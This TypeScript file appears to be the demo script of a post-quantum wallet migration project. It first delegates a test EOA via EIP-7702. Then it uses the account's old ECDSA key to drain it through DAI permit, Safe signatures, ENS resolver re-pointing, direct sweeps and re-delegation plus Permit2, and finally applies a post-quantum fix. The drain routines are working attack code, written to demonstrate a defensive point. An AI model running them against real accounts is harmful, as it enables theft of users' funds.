// Demo steps, each driven by the demo server one at a time. Every attack is SIGNED BY ALICE'S OLD
// ECDSA KEY (real signatures, no impersonation). Off-chain signatures are submitted by the attacker.
import {
  concat,
  decodeFunctionResult,
  encodeFunctionData,
  formatEther,
  formatUnits,
  getAddress,
  keccak256,
  parseAbi,
  parseEther,
  toHex,
  zeroAddress,
  zeroHash,
  type Address,
  type Hex,
} from "viem";
import { privateKeyToAccount, sign } from "viem/accounts";
import { daiAbi, ensPermissionedResolverAbi, erc20Abi, permit2Abi, safeAbi } from "../abis.js";
import { PQDelegate, QuantumCanary } from "../generated.js";
import { MAINNET } from "../mainnet.js";
import { executeDigest, type Cracker, type PQSigner } from "../pq.js";
import type { Call } from "../types.js";
import { clientsFor, errReason, waitOk } from "./clients.js";
import { DEMO_TOKENS, ETH_COIN_TYPE, type DemoWorld } from "./world.js";

export interface StepResult {
  step: string;
  ok: boolean;
  txHashes: Hex[];
  detail: string;
  data?: Record<string, unknown>;
  /** wall-clock duration of the step */
  ms?: number;
}

/** Resolver errors (ENSv2 EnhancedAccessControl) so reverts decode to a readable name. */
const resolverAbi = [
  ...ensPermissionedResolverAbi,
  ...parseAbi(["error EACUnauthorizedAccountRoles(uint256 resource, uint256 roleBitmap, address account)"]),
] as const;
const addrAbi = parseAbi(["function addr(bytes32 node) view returns (address)"]);

async function timed(step: string, fn: (txHashes: Hex[]) => Promise<Omit<StepResult, "step" | "txHashes" | "ms">>): Promise<StepResult> {
  const t0 = performance.now();
  const txHashes: Hex[] = [];
  try {
    const r = await fn(txHashes);
    return { step, txHashes, ...r, ms: Math.round(performance.now() - t0) };
  } catch (e) {
    return { step, ok: false, txHashes, detail: `error: ${errReason(e)}`, data: { error: String(e) }, ms: Math.round(performance.now() - t0) };
  }
}

function ctx(world: DemoWorld) {
  const c = clientsFor(world.rpcUrl);
  const alice = privateKeyToAccount(world.alice.privateKey);
  return {
    ...c,
    pc: c.publicClient,
    alice,
    aliceWallet: c.wallet(alice),
    attackerWallet: c.wallet(world.attacker.privateKey),
    relayerWallet: c.wallet(world.relayer.privateKey),
  };
}

const bal = (world: DemoWorld, token: Address, who: Address) =>
  clientsFor(world.rpcUrl).publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });

/** The attacker tops up the compromised EOA so the old key can pay gas for its own txs (if it was swept). */
async function ensureAliceGas(world: DemoWorld, txHashes: Hex[], min = parseEther("0.01")): Promise<bigint> {
  const { pc, attackerWallet } = ctx(world);
  const have = await pc.getBalance({ address: world.alice.address });
  if (have >= min) return 0n;
  const topUp = min - have;
  const h = await attackerWallet.sendTransaction({ to: world.alice.address, value: topUp });
  txHashes.push(h);
  await waitOk(pc, h, "attacker gas top-up");
  return topUp;
}

/** Current 7702 delegate of an address (undefined if none). */
export async function delegationOf(world: DemoWorld, who: Address = world.alice.address): Promise<Address | undefined> {
  const code = await clientsFor(world.rpcUrl).publicClient.getCode({ address: who });
  if (!code || !code.toLowerCase().startsWith("0xef0100") || code.length !== 2 + 46) return undefined;
  return getAddress(`0x${code.slice(8)}`);
}

/** Where the demo ENS name currently resolves (ENSv2 PermissionedResolver, ETH coin type). */
export async function ensResolvesTo(world: DemoWorld): Promise<Address> {
  const pc = clientsFor(world.rpcUrl).publicClient;
  const out = await pc.readContract({
    address: world.contracts.resolver,
    abi: ensPermissionedResolverAbi,
    functionName: "resolve",
    args: [world.ens.dnsName, encodeFunctionData({ abi: addrAbi, functionName: "addr", args: [zeroHash] })],
  });
  return decodeFunctionResult({ abi: addrAbi, functionName: "addr", data: out });
}

// ------------------------------------------------------------------ Act 1: migrate + canary

/**
 * Alice "migrates" the way most wallets ship today: EIP-7702-delegate her EOA to PQDelegate.
 * sponsor "relayer" (default): Alice signs the authorization, the relayer pays gas (Alice keeps exactly 3 ETH).
 * sponsor "self": Alice sends the type-4 tx herself (authorization nonce + 1, handled by viem's executor: 'self').
 */
export async function migrateTo7702(world: DemoWorld, opts: { sponsor?: "relayer" | "self" } = {}): Promise<StepResult> {
  return timed("migrate-7702", async (txHashes) => {
    const { pc, aliceWallet, relayerWallet } = ctx(world);
    const delegate = world.contracts.delegate;
    let hash: Hex;
    if (opts.sponsor === "self") {
      const auth = await aliceWallet.signAuthorization({ contractAddress: delegate, executor: "self" });
      hash = await aliceWallet.sendTransaction({ authorizationList: [auth], to: world.alice.address, data: "0x" });
    } else {
      const auth = await aliceWallet.signAuthorization({ contractAddress: delegate });
      hash = await relayerWallet.sendTransaction({ authorizationList: [auth], to: world.alice.address, data: "0x" });
    }
    txHashes.push(hash);
    await waitOk(pc, hash, "7702 delegation");
    const code = await pc.getCode({ address: world.alice.address });
    const expected = concat(["0xef0100", delegate]).toLowerCase();
    const ok = code?.toLowerCase() === expected;
    return {
      ok,
      detail: ok ? `Alice's EOA now runs PQDelegate ${delegate} (EIP-7702)` : `unexpected code at alice: ${code}`,
      data: { code, delegate, sponsor: opts.sponsor ?? "relayer" },
    };
  });
}

/**
 * The "quantum computer": recover the weak canary key from its public key, sign claimDigest(attacker)
 * RAW (the digest already has the eth-signed-message prefix), and claim. Trips every PQDelegate killswitch.
 */
export async function crackAndTripCanary(world: DemoWorld, cracker: Cracker): Promise<StepResult> {
  return timed("crack-canary", async (txHashes) => {
    const { pc, attackerWallet } = ctx(world);
    const canary = world.canary.address;
    const xy = await pc.readContract({ address: canary, abi: QuantumCanary.abi, functionName: "pubkey" });
    const pubkey = concat(["0x04", xy]);
    const cracked = await cracker.crack(pubkey, world.canary.bits);
    const canaryAddress = await pc.readContract({ address: canary, abi: QuantumCanary.abi, functionName: "canaryAddress" });
    const crackedAddress = privateKeyToAccount(cracked.privateKey).address;
    if (crackedAddress.toLowerCase() !== canaryAddress.toLowerCase())
      return { ok: false, detail: `cracker returned the wrong key (${crackedAddress} != ${canaryAddress})`, data: { ms: cracked.ms } };

    const bounty = await pc.getBalance({ address: canary });
    const digest = await pc.readContract({ address: canary, abi: QuantumCanary.abi, functionName: "claimDigest", args: [world.attacker.address] });
    const sig = await sign({ hash: digest, privateKey: cracked.privateKey });
    const hash = await attackerWallet.writeContract({
      address: canary,
      abi: QuantumCanary.abi,
      functionName: "claim",
      args: [world.attacker.address, Number(sig.v ?? BigInt(27 + (sig.yParity ?? 0))), sig.r, sig.s],
    });
    txHashes.push(hash);
    await waitOk(pc, hash, "canary claim");
    const tripped = await pc.readContract({ address: canary, abi: QuantumCanary.abi, functionName: "tripped" });
    let killswitch: boolean | undefined;
    try {
      killswitch = await pc.readContract({ address: world.alice.address, abi: PQDelegate.abi, functionName: "killswitch" });
    } catch {
      killswitch = undefined; // alice not delegated to PQDelegate
    }
    return {
      ok: tripped && killswitch === true,
      detail: `cracked the ${world.canary.bits}-bit canary key in ${cracked.ms} ms, claimed ${formatEther(bounty)} ETH; Alice's killswitch: ${
        killswitch === undefined ? "n/a (not delegated)" : killswitch ? "ON" : "off"
      }`,
      data: { ms: cracked.ms, bits: world.canary.bits, privateKey: cracked.privateKey, canaryAddress, bounty, tripped, killswitch },
    };
  });
}

// ------------------------------------------------------------------ Act 2: the old key attacks

/** Surface 3: DAI's ecrecover-only permit never asks the account code. Old key signs, attacker submits + pulls. */
export async function attackDaiPermit(world: DemoWorld): Promise<StepResult> {
  return timed("attack-dai-permit", async (txHashes) => {
    const { pc, alice, attackerWallet } = ctx(world);
    const DAI = DEMO_TOKENS.DAI;
    const nonce = await pc.readContract({ address: DAI, abi: daiAbi, functionName: "nonces", args: [alice.address] });
    const signature = await alice.signTypedData({
      domain: { name: "Dai Stablecoin", version: "1", chainId: world.chainId, verifyingContract: DAI },
      types: {
        Permit: [
          { name: "holder", type: "address" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "expiry", type: "uint256" },
          { name: "allowed", type: "bool" },
        ],
      },
      primaryType: "Permit",
      message: { holder: alice.address, spender: world.attacker.address, nonce, expiry: 0n, allowed: true },
    });
    const r = `0x${signature.slice(2, 66)}` as Hex;
    const s = `0x${signature.slice(66, 130)}` as Hex;
    const v = Number.parseInt(signature.slice(130, 132), 16);
    try {
      const h = await attackerWallet.writeContract({
        address: DAI,
        abi: daiAbi,
        functionName: "permit",
        args: [alice.address, world.attacker.address, nonce, 0n, true, v, r, s],
      });
      txHashes.push(h);
      await waitOk(pc, h, "DAI permit");
    } catch (e) {
      return { ok: false, detail: `DAI permit rejected: ${errReason(e)}`, data: { taken: 0n } };
    }
    const taken = await bal(world, DAI, alice.address);
    if (taken === 0n)
      return { ok: false, detail: "old key's DAI permit still accepted, but Alice holds 0 DAI: nothing to take", data: { taken, permitAccepted: true } };
    const h = await attackerWallet.writeContract({
      address: DAI,
      abi: erc20Abi,
      functionName: "transferFrom",
      args: [alice.address, world.attacker.address, taken],
    });
    txHashes.push(h);
    await waitOk(pc, h, "DAI transferFrom");
    return { ok: true, detail: `old key signed a DAI permit; attacker pulled ${formatUnits(taken, 18)} DAI`, data: { taken, permitAccepted: true } };
  });
}

/** Surface 5: Safe 1.4.1 checks owner signatures with ecrecover (v 27/28). Old key signs the safeTxHash. */
export async function attackSafe(world: DemoWorld): Promise<StepResult> {
  return timed("attack-safe", async (txHashes) => {
    const { pc, attackerWallet } = ctx(world);
    const safe = world.contracts.safe;
    const amount = await pc.getBalance({ address: safe });
    const nonce = await pc.readContract({ address: safe, abi: safeAbi, functionName: "nonce" });
    const args = [world.attacker.address, amount, "0x", 0, 0n, 0n, 0n, zeroAddress, zeroAddress] as const;
    const safeTxHash = await pc.readContract({ address: safe, abi: safeAbi, functionName: "getTransactionHash", args: [...args, nonce] });
    const sig = await sign({ hash: safeTxHash, privateKey: world.alice.privateKey, to: "hex" }); // r || s || v(27/28)
    try {
      const { request } = await pc.simulateContract({
        account: attackerWallet.account,
        address: safe,
        abi: safeAbi,
        functionName: "execTransaction",
        args: [...args, sig],
      });
      const h = await attackerWallet.writeContract(request);
      txHashes.push(h);
      await waitOk(pc, h, "Safe execTransaction");
    } catch (e) {
      const reason = errReason(e);
      return { ok: false, detail: `Safe rejected the old key's signature (${reason})`, data: { taken: 0n, reason } };
    }
    const after = await pc.getBalance({ address: safe });
    return {
      ok: after === 0n && amount > 0n,
      detail: `old key signed a Safe tx; attacker took ${formatEther(amount)} ETH from the Safe`,
      data: { taken: amount, safe },
    };
  });
}

/** Surface 6: ENSv2 resolver roles belong to the old key. A real tx signed by it re-points the name. */
export async function attackEns(world: DemoWorld): Promise<StepResult> {
  return timed("attack-ens", async (txHashes) => {
    const { pc, alice, aliceWallet } = ctx(world);
    const call = {
      address: world.contracts.resolver,
      abi: resolverAbi,
      functionName: "setAddress",
      args: [world.ens.dnsName, ETH_COIN_TYPE, world.attacker.address],
    } as const;
    try {
      await pc.simulateContract({ account: alice.address, ...call });
    } catch (e) {
      const reason = errReason(e);
      const resolved = await ensResolvesTo(world);
      return { ok: false, detail: `resolver rejected the old key (${reason}); ${world.ens.name} -> ${resolved}`, data: { reason, resolved } };
    }
    const topUp = await ensureAliceGas(world, txHashes);
    const h = await aliceWallet.writeContract(call);
    txHashes.push(h);
    await waitOk(pc, h, "resolver.setAddress");
    const resolved = await ensResolvesTo(world);
    const ok = resolved.toLowerCase() === world.attacker.address.toLowerCase();
    return { ok, detail: `old key re-pointed ${world.ens.name} -> ${resolved}`, data: { resolved, gasTopUp: topUp } };
  });
}

/** Surface 1: plain txs signed by the old key. Sweeps UNI + wstETH, then all ETH (exact gas, so nothing is left). */
export async function attackDirect(world: DemoWorld): Promise<StepResult> {
  return timed("attack-direct", async (txHashes) => {
    const { pc, alice, aliceWallet } = ctx(world);
    const attacker = world.attacker.address;
    // DAI and USDC are taken by the permit / Permit2 attacks; everything else goes in plain transfers.
    const sweep = [
      ["UNI", DEMO_TOKENS.UNI],
      ["wstETH", DEMO_TOKENS.WSTETH],
    ] as const;
    const balances = await Promise.all(sweep.map(([, t]) => bal(world, t, alice.address)));
    const eth0 = await pc.getBalance({ address: alice.address });
    if (balances.every((b) => b === 0n) && eth0 === 0n)
      return { ok: false, detail: "Alice's EOA holds no ETH, UNI or wstETH: nothing to send", data: { ethTaken: 0n } };

    let gasTopUp = 0n;
    const taken: string[] = [];
    for (let i = 0; i < sweep.length; i++) {
      const [sym, token] = sweep[i]!;
      const amount = balances[i]!;
      if (amount === 0n) continue;
      gasTopUp += await ensureAliceGas(world, txHashes);
      const h = await aliceWallet.writeContract({ address: token, abi: erc20Abi, functionName: "transfer", args: [attacker, amount] });
      txHashes.push(h);
      await waitOk(pc, h, `${sym} transfer`);
      taken.push(`${formatUnits(amount, 18)} ${sym}`);
    }

    // Sweep ETH: pay exactly baseFee * 21000 so the EOA ends at 0.
    let ethTaken = 0n;
    const eth = await pc.getBalance({ address: alice.address });
    const pending = await pc.getBlock({ blockTag: "pending" });
    const baseFee = pending.baseFeePerGas ?? (await pc.getGasPrice());
    const gas = 21_000n;
    if (eth > gas * baseFee) {
      ethTaken = eth - gas * baseFee;
      const h = await aliceWallet.sendTransaction({ to: attacker, value: ethTaken, gas, maxFeePerGas: baseFee, maxPriorityFeePerGas: 0n });
      txHashes.push(h);
      await waitOk(pc, h, "ETH sweep");
    }
    const left = await pc.getBalance({ address: alice.address });
    ethTaken = ethTaken > gasTopUp ? ethTaken - gasTopUp : 0n; // don't count the attacker's own gas money
    if (ethTaken > 0n) taken.unshift(`${Number(formatEther(ethTaken)).toFixed(4)} ETH`);
    return {
      ok: taken.length > 0,
      detail: taken.length ? `old key sent ${taken.join(" + ")} to the attacker` : "nothing to send",
      data: { ethTaken, uniTaken: balances[0]!, wstethTaken: balances[1]!, ethLeft: left, gasTopUp },
    };
  });
}

/**
 * Surfaces 2 + 4: the old key signs a 7702 authorization to address(0) (attacker relays it), which strips
 * PQDelegate's ERC-1271 gate. Permit2 is back to raw ecrecover, so the old key signs a PermitTransferFrom
 * for all of Alice's USDC (standing USDC->Permit2 approval) and the attacker pulls it.
 */
export async function attackRedelegateThenPermit2(world: DemoWorld): Promise<StepResult> {
  return timed("attack-redelegate-permit2", async (txHashes) => {
    const { pc, alice, aliceWallet, attackerWallet } = ctx(world);
    const before = await delegationOf(world);
    const auth = await aliceWallet.signAuthorization({ contractAddress: zeroAddress });
    const h1 = await attackerWallet.sendTransaction({ authorizationList: [auth], to: alice.address, data: "0x" });
    txHashes.push(h1);
    await waitOk(pc, h1, "re-delegation");
    const after = await delegationOf(world);

    const USDC = DEMO_TOKENS.USDC;
    const amount = await bal(world, USDC, alice.address);
    const allowance = await pc.readContract({ address: USDC, abi: erc20Abi, functionName: "allowance", args: [alice.address, MAINNET.permit2] });
    const redelegated = `old key cleared the 7702 delegation (${before ?? "none"} -> ${after ?? "none"})`;
    if (amount === 0n || allowance < amount)
      return {
        ok: false,
        detail: `${redelegated}, but Alice has ${formatUnits(amount, 6)} USDC and Permit2 allowance ${allowance === 0n ? "0" : formatUnits(allowance, 6)}: nothing to pull`,
        data: { taken: 0n, balance: amount, allowance, delegationBefore: before, delegationAfter: after },
      };

    const block = await pc.getBlock();
    const nonce = BigInt(keccak256(toHex(`gk-permit2-${alice.address}-${block.number}-${Math.random()}`))) >> 8n;
    const deadline = block.timestamp + 3600n;
    const permitted = { token: USDC, amount };
    const signature = await alice.signTypedData({
      domain: { name: "Permit2", chainId: world.chainId, verifyingContract: MAINNET.permit2 },
      types: {
        PermitTransferFrom: [
          { name: "permitted", type: "TokenPermissions" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" },
        ],
      },
      primaryType: "PermitTransferFrom",
      message: { permitted, spender: world.attacker.address, nonce, deadline },
    });
    try {
      const { request } = await pc.simulateContract({
        account: attackerWallet.account,
        address: MAINNET.permit2,
        abi: permit2Abi,
        functionName: "permitTransferFrom",
        args: [{ permitted, nonce, deadline }, { to: world.attacker.address, requestedAmount: amount }, alice.address, signature],
      });
      const h2 = await attackerWallet.writeContract(request);
      txHashes.push(h2);
      await waitOk(pc, h2, "Permit2 permitTransferFrom");
    } catch (e) {
      const reason = errReason(e);
      return { ok: false, detail: `${redelegated}, but Permit2 rejected the signature (${reason})`, data: { taken: 0n, reason } };
    }
    return {
      ok: true,
      detail: `${redelegated}; then a Permit2 signature pulled ${formatUnits(amount, 6)} USDC`,
      data: { taken: amount, delegationBefore: before, delegationAfter: after },
    };
  });
}

// ------------------------------------------------------------------ Act 3: the fix

/**
 * GhostKey "Complete migration": one leanSphincs-s-signed batch, executed by Alice's delegated EOA
 * (PQDelegate.execute), submitted and paid for by the relayer.
 */
export async function completeMigration(world: DemoWorld, calls: Call[], pqSigner: PQSigner): Promise<StepResult> {
  return timed("complete-migration", async (txHashes) => {
    const { pc, relayerWallet } = ctx(world);
    const account = world.alice.address;
    const nonce = await pc.readContract({ address: account, abi: PQDelegate.abi, functionName: "nonce" });
    const digest = executeDigest(world.chainId, account, nonce, calls);
    const onchain = await pc.readContract({ address: account, abi: PQDelegate.abi, functionName: "executeDigest", args: [calls] });
    if (onchain !== digest) return { ok: false, detail: `digest mismatch: off-chain ${digest} != on-chain ${onchain}` };
    const t0 = performance.now();
    const sig = await pqSigner.sign(digest);
    const signMs = Math.round(performance.now() - t0);
    const h = await relayerWallet.writeContract({ address: account, abi: PQDelegate.abi, functionName: "execute", args: [calls, sig] });
    txHashes.push(h);
    const r = await waitOk(pc, h, "PQ execute");
    return {
      ok: true,
      detail: `${calls.length} calls executed atomically with one ${(sig.length - 2) / 2}-byte leanSphincs-s signature (gas ${r.gasUsed})`,
      data: { digest, nonce, signMs, sigBytes: (sig.length - 2) / 2, gasUsed: r.gasUsed, calls: calls.length },
    };
  });
}
